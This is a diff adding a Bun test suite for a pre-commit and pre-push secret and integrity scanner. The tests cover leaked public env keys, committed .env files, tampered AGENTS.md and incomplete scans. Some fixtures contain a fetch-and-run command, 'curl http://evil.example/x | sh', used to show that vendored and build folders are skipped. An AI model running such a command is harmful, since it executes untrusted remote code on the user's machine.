@@ -1,0 +1,450 @@
+/**
+ * src/check.test.ts — `vibe-fence check` engine (Guarded tier).
+ * Runs REGISTRY over a project tree; any fail → exit 1.
+ * Run: bun test src/check.test.ts
+ */
+import { describe, it, expect, afterEach } from "bun:test";
+import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import { execFileSync, execSync } from "node:child_process";
+import { runCheck, runIndexCheck, runPushCheck, exitCodeForReport } from "./check";
+import { persistAttestation, FENCE_SYNC_TOKEN_ENV } from "./framework/integrity";
+
+const created: string[] = [];
+afterEach(() => {
+  for (const d of created.splice(0)) rmSync(d, { recursive: true, force: true });
+});
+
+function makeProject(files: Record<string, string>): string {
+  const root = mkdtempSync(join(tmpdir(), "vf-check-"));
+  created.push(root);
+  for (const [rel, content] of Object.entries(files)) {
+    const p = join(root, rel);
+    mkdirSync(join(p, ".."), { recursive: true });
+    writeFileSync(p, content, "utf-8");
+  }
+  return root;
+}
+
+function gitEnv(): Record<string, string> {
+  return { ...(process.env as Record<string, string>), GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_SYSTEM: "/dev/null" };
+}
+
+function sh(cwd: string, cmd: string): string {
+  return execSync(cmd, { cwd, env: gitEnv(), encoding: "utf-8" }).trim();
+}
+
+function makeGitProject(): string {
+  const root = mkdtempSync(join(tmpdir(), "vf-index-"));
+  created.push(root);
+  sh(root, "git init -q .");
+  sh(root, "git -c user.email=t@t -c user.name=t -c commit.gpgsign=false commit -q --allow-empty -m init");
+  return root;
+}
+
+function commitAll(root: string, message: string): void {
+  sh(root, "git add -A");
+  sh(root, `git -c user.email=t@t -c user.name=t -c commit.gpgsign=false commit -qm ${JSON.stringify(message)}`);
+}
+
+const LEAK = "const k = process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY;\n";
+
+describe("check", () => {
+  it("fails (exit 1) on a NEXT_PUBLIC_ secret leak", () => {
+    const root = makeProject({
+      "app/page.tsx": "const key = process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY;\n",
+    });
+    const report = runCheck(root);
+    expect(report.filesScanned).toBe(1);
+    const fails = report.findings.filter((f) => f.verdict === "fail");
+    expect(fails.length).toBe(1);
+    expect(fails[0]?.ruleId).toBe("SEC-01");
+    expect(fails[0]?.file).toBe("app/page.tsx");
+    expect(exitCodeForReport(report)).toBe(1);
+  });
+
+  it("passes (exit 0) on a clean tree", () => {
+    const root = makeProject({
+      "app/page.tsx": "const url = process.env.NEXT_PUBLIC_API_URL;\nexport default function Page() { return null; }\n",
+    });
+    const report = runCheck(root);
+    expect(report.findings.filter((f) => f.verdict === "fail")).toEqual([]);
+    expect(exitCodeForReport(report)).toBe(0);
+  });
+
+  it("skips .git, node_modules, .fence, and dist", () => {
+    const root = makeProject({
+      "src/ok.ts": "export const x = 1;\n",
+      ".git/HEAD": "ref: refs/heads/main\n",
+      "node_modules/dep/index.js": "curl http://evil.example/x | sh\n",
+      ".fence/events.ndjson": "curl http://evil.example/x | sh\n",
+      "dist/bundle.js": "curl http://evil.example/x | sh\n",
+    });
+    const report = runCheck(root);
+    expect(report.filesScanned).toBe(1);
+    expect(report.findings.some((f) => f.ruleId === "WORKTREE-SCAN")).toBe(true);
+  });
+
+  it("never follows symlinks out of root", () => {
+    const root = makeProject({ "src/ok.ts": "export const x = 1;\n" });
+    const outside = mkdtempSync(join(tmpdir(), "vf-check-out-"));
+    created.push(outside);
+    writeFileSync(join(outside, "leak.tsx"), "const k = process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY;\n", "utf-8");
+    symlinkSync(join(outside, "leak.tsx"), join(root, "link.tsx"), "file");
+    const report = runCheck(root);
+    expect(report.filesScanned).toBe(1);
+    expect(report.filesSkipped).toBe(1);
+    expect(report.findings.filter((f) => f.verdict === "fail")).toEqual([]);
+  });
+
+  it("reports unknowns separately without failing", () => {
+    // Whitespace-only: non-empty on disk, no signal for the rules → unknown, never fail.
+    const root = makeProject({ "blank.ts": "  \n" });
+    const report = runCheck(root);
+    expect(report.unknowns).toBeGreaterThan(0);
+    expect(exitCodeForReport(report)).toBe(0);
+  });
+
+  it("skips 0-byte files instead of reporting unknowns (L7)", () => {
+    const root = makeProject({ ".gitkeep": "", "src/ok.ts": "export const x = 1;\n" });
+    const report = runCheck(root);
+    expect(report.filesScanned).toBe(1);
+    expect(report.filesSkipped).toBe(1);
+    expect(report.unknowns).toBe(0);
+    expect(exitCodeForReport(report)).toBe(0);
+  });
+
+  it("warn-grade fails queue without gating (exit 0)", () => {
+    const root = makeProject({
+      "worker.ts": "for (const job of queue) {\n  await fetch(job.url);\n}\n",
+    });
+    const report = runCheck(root);
+    expect(report.findings.filter((f) => f.ruleId === "BILL-01" && f.verdict === "fail").length).toBe(1);
+    expect(report.blocks).toBe(0);
+    expect(exitCodeForReport(report)).toBe(0);
+  });
+
+  it("accepts --json-safe report shape (no undefined holes)", () => {
+    const root = makeProject({ "a.ts": "export const x = 1;\n" });
+    const report = runCheck(root);
+    expect(() => JSON.stringify(report)).not.toThrow();
+    const roundtrip = JSON.parse(JSON.stringify(report)) as typeof report;
+    expect(roundtrip.filesScanned).toBe(1);
+  });
+});
+
+describe("index-aware scans (L1)", () => {
+  it("runIndexCheck blocks staged leaks the worktree scan cannot see", () => {
+    const root = makeGitProject();
+    writeFileSync(join(root, "app.tsx"), LEAK, "utf-8");
+    sh(root, "git add app.tsx");
+    writeFileSync(join(root, "app.tsx"), "export const x = 1;\n", "utf-8"); // clean worktree, dirty index
+    expect(runCheck(root).blocks).toBe(0); // worktree scan is blind by construction
+    const staged = runIndexCheck(root);
+    expect(staged.filesScanned).toBe(1);
+    expect(staged.blocks).toBe(1);
+    expect(staged.findings.some((f) => f.ruleId === "SEC-01" && f.verdict === "fail")).toBe(true);
+    expect(exitCodeForReport(staged)).toBe(1);
+  });
+
+  it("runIndexCheck passes clean and empty stages but rejects non-repositories", () => {
+    const root = makeGitProject();
+    writeFileSync(join(root, "ok.ts"), "export const x = 1;\n", "utf-8");
+    sh(root, "git add ok.ts");
+    const staged = runIndexCheck(root);
+    expect(staged.blocks).toBe(0);
+    expect(exitCodeForReport(staged)).toBe(0);
+    commitAll(root, "base");
+    const empty = runIndexCheck(root);
+    expect(empty.filesScanned).toBe(0);
+    expect(exitCodeForReport(empty)).toBe(0);
+    const plain = makeProject({ "a.ts": "export const x = 1;\n" });
+    expect(runIndexCheck(plain).filesScanned).toBe(0);
+    expect(exitCodeForReport(runIndexCheck(plain))).toBe(1);
+  });
+
+  it("runPushCheck scans an explicit outgoing range (bare rev = commit vs parent)", () => {
+    const root = makeGitProject();
+    writeFileSync(join(root, "ok.ts"), "export const x = 1;\n", "utf-8");
+    commitAll(root, "base");
+    writeFileSync(join(root, "leak.tsx"), LEAK, "utf-8");
+    commitAll(root, "leaky");
+    const pushed = runPushCheck(root, ["HEAD~1..HEAD"]);
+    expect(pushed.blocks).toBe(1);
+    expect(pushed.findings.some((f) => f.ruleId === "SEC-01" && f.verdict === "fail")).toBe(true);
+    expect(exitCodeForReport(pushed)).toBe(1);
+    const clean = runPushCheck(root, ["HEAD~1"]); // base commit vs init: clean
+    expect(clean.blocks).toBe(0);
+    expect(exitCodeForReport(clean)).toBe(0);
+  });
+
+  it("runPushCheck scans the tip tree for new refs (zero base)", () => {
+    const root = makeGitProject();
+    writeFileSync(join(root, "leak.tsx"), LEAK, "utf-8");
+    commitAll(root, "leaky");
+    const pushed = runPushCheck(root, [`${"0".repeat(40)}..HEAD`]);
+    expect(pushed.blocks).toBe(1);
+    expect(exitCodeForReport(pushed)).toBe(1);
+  });
+
+  it("blocks an outgoing leak even when a later commit fixes it", () => {
+    const root = makeGitProject();
+    const base = sh(root, "git rev-parse HEAD");
+    writeFileSync(join(root, "app.tsx"), LEAK);
+    commitAll(root, "leak");
+    writeFileSync(join(root, "app.tsx"), "export const ok = 1;\n");
+    commitAll(root, "fix");
+    expect(runCheck(root).blocks).toBe(0);
+    const report = runPushCheck(root, [`${base}..HEAD`]);
+    expect(report.findings.some((f) => f.ruleId === "SEC-01" && f.verdict === "fail")).toBe(true);
+    expect(exitCodeForReport(report)).toBe(1);
+  });
+
+  it("blocks a leak removed from a later outgoing commit", () => {
+    const root = makeGitProject();
+    const base = sh(root, "git rev-parse HEAD");
+    writeFileSync(join(root, "app.tsx"), LEAK);
+    commitAll(root, "leak");
+    rmSync(join(root, "app.tsx"));
+    commitAll(root, "delete");
+    expect(exitCodeForReport(runPushCheck(root, [`${base}..HEAD`]))).toBe(1);
+  });
+
+  it("skips binary files in outgoing history without a false missing-blob block", () => {
+    const root = makeGitProject();
+    const base = sh(root, "git rev-parse HEAD");
+    writeFileSync(join(root, "logo.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x00, 0x01, 0x02]));
+    writeFileSync(join(root, "notes.txt"), "export const ok = 1;\n");
+    // Same bytes as a text file: the binary outcome must not depend on an
+    // unrelated file's content hash.
+    writeFileSync(join(root, "same.txt"), "identical\n");
+    writeFileSync(join(root, "copy.png"), "identical\n");
+    commitAll(root, "assets");
+    const report = runPushCheck(root, [`${base}..HEAD`]);
+    expect(report.findings.filter((f) => f.ruleId === "PUSH-SCAN")).toHaveLength(0);
+    expect(report.findings).toHaveLength(0);
+    expect(exitCodeForReport(report)).toBe(0);
+    expect(report.filesSkipped).toBe(2);
+    expect(report.filesScanned).toBe(2);
+  });
+
+  it("scans every changed file across batched metadata and content reads", () => {
+    const root = makeGitProject();
+    const base = sh(root, "git rev-parse HEAD");
+    for (let i = 0; i < 140; i++) writeFileSync(join(root, `f${i}.ts`), `export const v${i} = ${i};\n`);
+    writeFileSync(join(root, "f139.ts"), LEAK); // last file, later ls-tree chunk
+    commitAll(root, "many files");
+    const report = runPushCheck(root, [`${base}..HEAD`]);
+    expect(report.filesScanned).toBe(140);
+    expect(report.findings.some((f) => f.ruleId === "SEC-01" && f.file.startsWith("f139.ts"))).toBe(true);
+    expect(exitCodeForReport(report)).toBe(1);
+  });
+
+  it("blocks a historical env file even if removed and ignored later", () => {
+    const root = makeGitProject();
+    const base = sh(root, "git rev-parse HEAD");
+    const marker = "fabricated-private-value";
+    writeFileSync(join(root, ".env"), `PASSWORD=${marker}\n`);
+    sh(root, "git add -f .env");
+    commitAll(root, "env");
+    rmSync(join(root, ".env"));
+    writeFileSync(join(root, ".gitignore"), ".env\n");
+    writeFileSync(join(root, ".env.example"), "PASSWORD=\n");
+    commitAll(root, "remove and ignore");
+    const report = runPushCheck(root, [`${base}..HEAD`]);
+    expect(report.findings.some((f) => f.ruleId === "SEC-03" && f.verdict === "fail" && f.file.startsWith(".env (commit "))).toBe(true);
+    expect(report.findings.some((f) => f.ruleId === "SEC-03" && f.verdict === "fail" && f.file.startsWith(".env.example"))).toBe(false);
+    expect(JSON.stringify(report)).not.toContain(marker);
+    expect(exitCodeForReport(report)).toBe(1);
+  });
+
+  it("blocks an empty env file in outgoing history without exposing contents", () => {
+    const root = makeGitProject();
+    const base = sh(root, "git rev-parse HEAD");
+    writeFileSync(join(root, ".env.local"), "");
+    sh(root, "git add -f .env.local");
+    commitAll(root, "empty env");
+    rmSync(join(root, ".env.local"));
+    writeFileSync(join(root, ".gitignore"), ".env.local\n");
+    commitAll(root, "delete and ignore");
+    const report = runPushCheck(root, [`${base}..HEAD`]);
+    expect(report.findings.some((f) => f.ruleId === "SEC-03" && f.verdict === "fail")).toBe(true);
+    expect(exitCodeForReport(report)).toBe(1);
+  });
+
+  it("scans the same filename independently across multiple pushed refs", () => {
+    const root = makeGitProject();
+    const base = sh(root, "git rev-parse HEAD");
+    writeFileSync(join(root, "app.tsx"), "export const ok = 1;\n");
+    commitAll(root, "clean");
+    const clean = sh(root, "git rev-parse HEAD");
+    sh(root, `git checkout -q --detach ${base}`);
+    writeFileSync(join(root, "app.tsx"), LEAK);
+    commitAll(root, "leak");
+    const leaky = sh(root, "git rev-parse HEAD");
+    expect(exitCodeForReport(runPushCheck(root, [`${base}..${clean}`, `${base}..${leaky}`]))).toBe(1);
+  });
+
+  it("scans history for a new ref, not just its clean tip", () => {
+    const root = makeGitProject();
+    writeFileSync(join(root, "app.tsx"), LEAK);
+    commitAll(root, "leak");
+    writeFileSync(join(root, "app.tsx"), "export const ok = 1;\n");
+    commitAll(root, "fix");
+    expect(exitCodeForReport(runPushCheck(root, [`${"0".repeat(40)}..HEAD`]))).toBe(1);
+  });
+
+  it("blocks when an outgoing range or a scan limit cannot be evaluated", () => {
+    const root = makeGitProject();
+    const base = sh(root, "git rev-parse HEAD");
+    writeFileSync(join(root, "a.ts"), "export const a = 1;\n");
+    writeFileSync(join(root, "b.ts"), "export const b = 2;\n");
+    commitAll(root, "clean");
+    expect(exitCodeForReport(runPushCheck(root, [`${base}..HEAD`], { maxFiles: 1 }))).toBe(1);
+    expect(exitCodeForReport(runPushCheck(root, ["nonexistent..HEAD"]))).toBe(1);
+    expect(exitCodeForReport(runPushCheck(root, [`${base}..HEAD`], { maxBytesPerFile: 1 }))).toBe(1);
+    expect(exitCodeForReport(runPushCheck(root, [`${base}..HEAD`]))).toBe(0);
+  });
+
+  it("reports gitlinks as unsupported instead of claiming submodule history was scanned", () => {
+    const root = makeGitProject();
+    const base = sh(root, "git rev-parse HEAD");
+    sh(root, `git update-index --add --cacheinfo 160000,${base},vendor`);
+    sh(root, "git -c user.email=t@t -c user.name=t -c commit.gpgsign=false commit -qm submodule");
+    const report = runPushCheck(root, [`${base}..HEAD`]);
+    expect(report.findings.some((f) => f.ruleId === "PUSH-SCAN" && /submodule/i.test(f.reason))).toBe(true);
+    expect(exitCodeForReport(report)).toBe(1);
+  });
+
+  it("does not resolve historical file paths through the current worktree symlinks", () => {
+    const root = makeGitProject();
+    const base = sh(root, "git rev-parse HEAD");
+    mkdirSync(join(root, "folder"));
+    writeFileSync(join(root, "folder/a.js"), "export const ok = 1;\n");
+    commitAll(root, "add");
+    rmSync(join(root, "folder"), { recursive: true });
+    commitAll(root, "delete");
+    const outside = mkdtempSync(join(tmpdir(), "vf-historical-out-"));
+    created.push(outside);
+    symlinkSync(outside, join(root, "folder"), "dir");
+    const report = runPushCheck(root, [`${base}..HEAD`]);
+    expect(report.findings.some((f) => f.ruleId === "FS-01" && f.verdict === "fail")).toBe(false);
+    expect(exitCodeForReport(report)).toBe(0);
+  });
+
+  it("does not call a shallow new-ref history clean when older commits are missing", () => {
+    const root = makeGitProject();
+    writeFileSync(join(root, "app.tsx"), LEAK);
+    commitAll(root, "leak");
+    writeFileSync(join(root, "app.tsx"), "export const ok = 1;\n");
+    commitAll(root, "fix");
+    const shallow = join(mkdtempSync(join(tmpdir(), "vf-shallow-parent-")), "clone");
+    created.push(join(shallow, ".."));
+    execFileSync("git", ["clone", "-q", "--depth=1", `file://${root}`, shallow], { env: gitEnv() });
+    const report = runPushCheck(shallow, [`${"0".repeat(40)}..HEAD`]);
+    expect(report.findings.some((f) => f.ruleId === "PUSH-SCAN" && f.verdict === "fail")).toBe(true);
+    expect(exitCodeForReport(report)).toBe(1);
+  });
+
+  it("scans a merged branch and does not mistake its deleted paths for unreadable blobs", () => {
+    const root = makeGitProject();
+    const base = sh(root, "git rev-parse HEAD");
+    sh(root, "git checkout -qb side");
+    writeFileSync(join(root, "app.tsx"), LEAK);
+    commitAll(root, "leak");
+    rmSync(join(root, "app.tsx"));
+    commitAll(root, "delete");
+    sh(root, `git checkout -q --detach ${base}`);
+    writeFileSync(join(root, "other.ts"), "export const other = 1;\n");
+    commitAll(root, "other");
+    sh(root, "git -c user.email=t@t -c user.name=t -c commit.gpgsign=false merge --no-ff -qm merge side");
+    const report = runPushCheck(root, [`${base}..HEAD`]);
+    expect(report.findings.some((f) => f.ruleId === "SEC-01" && f.verdict === "fail")).toBe(true);
+    expect(report.findings.some((f) => f.ruleId === "PUSH-SCAN")).toBe(false);
+    expect(exitCodeForReport(report)).toBe(1);
+  });
+});
+
+describe("fence-owned integrity in check (C7/S-06)", () => {
+  it("blocks on attested-file drift, stays silent without attestation", () => {
+    const root = makeProject({ "AGENTS.md": "canonical\n", "a.ts": "export const x = 1;\n" });
+    // Hermetic vs file order: install.test.ts may run first in this process
+    // (it does on Linux CI) and install() mints FENCE_SYNC_TOKEN, which
+    // sync-bypasses verifyAttestation. This test asserts no-sync behavior,
+    // so the token stays cleared except around persistAttestation (same
+    // pattern as sweep S8).
+    const saved = process.env[FENCE_SYNC_TOKEN_ENV];
+    delete process.env[FENCE_SYNC_TOKEN_ENV];
+    try {
+      // No store → silent (nothing to verify against).
+      expect(runCheck(root).findings.some((f) => f.ruleId === "S-06")).toBe(false);
+      mkdirSync(join(root, ".fence"), { recursive: true });
+      process.env[FENCE_SYNC_TOKEN_ENV] = "test-token";
+      persistAttestation(root);
+      delete process.env[FENCE_SYNC_TOKEN_ENV];
+      // Clean → no S-06 finding.
+      expect(runCheck(root).findings.some((f) => f.ruleId === "S-06")).toBe(false);
+      // Tamper → S-06 block.
+      writeFileSync(join(root, "AGENTS.md"), "evil AGENTS\n", "utf-8");
+      const drifted = runCheck(root);
+      expect(drifted.blocks).toBeGreaterThanOrEqual(1);
+      expect(drifted.findings.some((f) => f.ruleId === "S-06" && f.verdict === "fail")).toBe(true);
+      expect(exitCodeForReport(drifted)).toBe(1);
+    } finally {
+      if (saved === undefined) delete process.env[FENCE_SYNC_TOKEN_ENV];
+      else process.env[FENCE_SYNC_TOKEN_ENV] = saved;
+    }
+  });
+});
+
+describe("incomplete scan boundaries", () => {
+  it("blocks a capped worktree while allowing an exact cap", () => {
+    const root = makeProject({ "a.ts": "export const ok = 1;\n", "b.ts": LEAK });
+    const limited = runCheck(root, { maxFiles: 1 });
+    expect(limited.findings.some(f => f.ruleId === "WORKTREE-SCAN")).toBe(true);
+    expect(exitCodeForReport(limited)).toBe(1);
+    expect(runCheck(root, { maxFiles: 2 }).findings.some(f => f.ruleId === "WORKTREE-SCAN")).toBe(false);
+    expect(runCheck(root).findings.some(f => f.ruleId === "SEC-01")).toBe(true);
+  });
+
+  it("blocks a capped index even when the worktree copy is clean", () => {
+    const root = makeGitProject();
+    writeFileSync(join(root, "a.ts"), "export const ok = 1;\n");
+    writeFileSync(join(root, "b.ts"), LEAK);
+    sh(root, "git add a.ts b.ts");
+    writeFileSync(join(root, "b.ts"), "export const ok = 2;\n");
+    expect(runIndexCheck(root, { maxFiles: 1 }).findings.some(f => f.ruleId === "INDEX-SCAN")).toBe(true);
+    expect(runIndexCheck(root).findings.some(f => f.ruleId === "SEC-01")).toBe(true);
+    expect(runCheck(root).blocks).toBe(0);
+  });
+
+  it("blocks oversized inputs and unavailable repositories", () => {
+    const root = makeProject({ "large.ts": "abcdef" });
+    expect(exitCodeForReport(runCheck(root, { maxBytesPerFile: 2 }))).toBe(1);
+    expect(exitCodeForReport(runIndexCheck(root))).toBe(1);
+  });
+});
+
+it("counts staged symlinks as exclusions while scanning empty env files", () => {
+  const root = makeGitProject();
+  symlinkSync("missing-target", join(root, "link"));
+  writeFileSync(join(root, ".env"), "");
+  sh(root, "git add --force .env link");
+  const report = runIndexCheck(root);
+  expect(report.filesSkipped).toBe(1);
+  expect(report.findings.some(f => f.ruleId === "SEC-03")).toBe(true);
+});
+
+it("marks an unreadable eligible worktree file incomplete", async () => {
+  const { chmodSync } = await import("node:fs");
+  const root = makeProject({ "unreadable.ts": "export const x = 1;\n" });
+  const path = join(root, "unreadable.ts");
+  chmodSync(path, 0);
+  try {
+    const report = runCheck(root);
+    expect(report.findings.some(f => f.ruleId === "WORKTREE-SCAN")).toBe(true);
+    expect(exitCodeForReport(report)).toBe(1);
+    expect(report.filesScanned).toBe(0);
+  } finally { chmodSync(path, 0o600); }
+});
